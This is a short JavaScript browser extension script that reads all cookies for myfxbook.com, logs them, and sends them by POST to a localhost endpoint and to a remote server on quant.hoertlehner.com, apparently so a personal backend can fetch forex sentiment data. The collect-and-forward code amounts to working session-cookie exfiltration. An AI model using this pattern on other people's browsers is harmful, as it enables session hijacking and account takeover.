

const serverLocal = "http://localhost:8080/api/sentiment";
const serverProd = "http://quant.hoertlehner.com:8080/api/sentiment";


const domain = "www.myfxbook.com";

console.log("getting cookies for myfxbook...")

function onError(err) {
    console.error("error: " + err);
    console.error(err);
}

function onSuccess(r) {
    console.log("success: " + r);
    console.log(r);
}


function sendData(server, cookies) {
    console.log("Sending myfxbook cookies to: " + server);
    var json = JSON.stringify(cookies);
    console.log("Sending cookies json v7: " + json)
    try {
        var p = fetch(server, {
            method: "POST",
            // body: json,
            body: new URLSearchParams({"data": json}), 
            headers: {
                "Accept": "application/json",
              //  "Content-Type": "application/text"
              'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
        console.log("promise:")
        console.log(p)
        p.then(onSuccess);
        p.catch(onError);
    }
    catch (err) {
        console.error ("post data error for server: " + server)
        console.error(err);
    }
};


function onCookies(cookies) {
    console.log("cookies for myfxbook: ");
    console.log(cookies);
    console.log(JSON.stringify(cookies));
    sendData(serverLocal, cookies);
    sendData(serverProd, cookies);
};

const r = chrome.cookies.getAll({ "domain": domain }) //domain: stackoverflow.com
r.then(onCookies);






